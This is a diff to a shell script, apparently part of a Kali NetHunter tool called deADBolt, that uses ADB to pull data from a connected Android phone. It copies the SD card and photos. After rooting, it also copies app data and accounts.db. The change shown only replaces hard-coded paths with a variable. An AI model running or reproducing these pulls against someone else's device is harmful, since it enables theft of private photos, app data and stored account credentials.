@@ -1,5 +1,13 @@
 #!/bin/sh
 
+###########
+###Setup###
+###########
+deadboltdir=/sdcard/kali-nh/deADBolt
+
+
+
+
 
 f_menu(){
 	clear
@@ -30,7 +38,7 @@ f_menu(){
 ###Towelroot###
 ###############
 f_towelroot(){
-	read -p "Not Complete. Press [Enter] to continue."
+	read -p "Press [Enter] to return to main menu." null
 }
 
 ################################
@@ -65,7 +73,7 @@ f_pullallsd(){
 	echo "Pulling data..."
 	echo ""
 	date=$(date +%m%d%Y-%H.%M.%S)
-	adb pull /sdcard/ /sdcard/deADBolt/sd-pull/SDcard-$date
+	adb pull /sdcard/ $deadboltdir/sd-pull/SDcard-$date
 	clear
 	echo "SD card pull complete. You can find the data in '/sdcard/deADBolt/sd-pull/SDcard-$date'."
 	echo ""
@@ -82,7 +90,7 @@ f_appdata(){
 	adb wait-for-device
 	clear
 	echo "Attempting to gain root. There may be a superuser prompt on the device's screen."
-	$adb push /sdcard/kali-nh/deADBolt/files/busybox-static /data/local/tmp/busybox
+	$adb push $deadboltdir/files/busybox-static /data/local/tmp/busybox
 	$adb shell "chmod a+x /data/local/tmp/busybox"
 	rooted=$(isRoot noinfo)
 	if [ "$rooted" = "1" ]
@@ -91,7 +99,7 @@ f_appdata(){
 			echo "Device is rooted. Retrieving app data."
 			date=$(date +%m%d%Y-%H.%M.%S)
 			adb shell "su -c "mount -o rw,remount /dev/block/mmcblk0p1 /system""
-			adb pull /data/data/ /sdcard/deADBolt/data-pull/data-$date
+			adb pull /data/data/ $deadboltdir/data-pull/data-$date
 			clear
 			echo "Data pull complete. You can find the data in '/sdcard/deADBolt/data-pull/data-$date'"
 			echo ""
@@ -114,8 +122,8 @@ f_cameraroll(){
 	adb wait-for-device
 	clear
 	date=$(date +%m%d%Y-%H.%M.%S)
-	adb pull /sdcard/DCIM/ /sdcard/deADBolt/photo-pull/photos-$date/DCIM
-	adb pull /sdcard/Pictures/ /sdcard/deADBolt/photo-pull/photos-$date/Pictures
+	adb pull /sdcard/DCIM/ $deadboltdir/photo-pull/photos-$date/DCIM
+	adb pull /sdcard/Pictures/ $deadboltdir/photo-pull/photos-$date/Pictures
 	clear
 	echo "Photo pull complete. You can find the data in '/sdcard/deADBolt/photo-pull/photos-$date'"
 	echo ""
@@ -132,7 +140,7 @@ f_accountdata(){
 	adb wait-for-device
 	clear
 	echo "Attempting to gain root. There may be a superuser prompt on the device's screen."
-	$adb push /sdcard/kali-nh/deADBolt/files/busybox-static /data/local/tmp/busybox
+	$adb push $deadboltdir/files/busybox-static /data/local/tmp/busybox
 	$adb shell "chmod a+x /data/local/tmp/busybox"
 	rooted=$(isRoot noinfo)
 	if [ "$rooted" = "1" ]
@@ -141,7 +149,7 @@ f_accountdata(){
 			echo "Device is rooted. Retrieving accounts.db"
 			date=$(date +%m%d%Y-%H.%M.%S)
 			adb shell "su -c "mount -o rw,remount /dev/block/mmcblk0p1 /system""
-			adb pull /data/system/users/0/accounts.db /sdcard/deADBolt/account-pull/accounts-$date/accounts.db
+			adb pull /data/system/users/0/accounts.db $deadboltdir/account-pull/accounts-$date/accounts.db
 			clear
 			echo "Accounts.db pull complete. You can find the data in '/sdcard/deADBolt/account-pull/accounts-$date'"
 			echo ""
